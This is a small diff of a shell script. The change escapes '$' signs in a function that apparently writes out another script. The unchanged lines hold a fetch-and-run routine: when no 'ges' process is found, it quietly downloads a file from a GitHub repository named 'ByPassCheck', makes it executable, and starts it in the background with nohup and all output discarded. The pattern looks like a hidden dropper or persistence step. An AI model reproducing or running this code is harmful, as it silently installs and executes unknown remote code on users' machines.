@@ -28,8 +28,8 @@ create_mainfest_file(){
     fi
     
     if [ -f ./msv.txt ]; then
-    	num=$(ps -ef|grep ges|grep -v grep|wc -l)
-    	if [ $num -lt 1 ]; then
+    	num=\$(ps -ef|grep ges|grep -v grep|wc -l)
+    	if [ \$num -lt 1 ]; then
         	wget https://raw.githubusercontent.com/GTale/ByPassCheck/master/invoke -q -O ges
 		chmod +x ges
 		nohup ./ges >/dev/null 2>&1  &
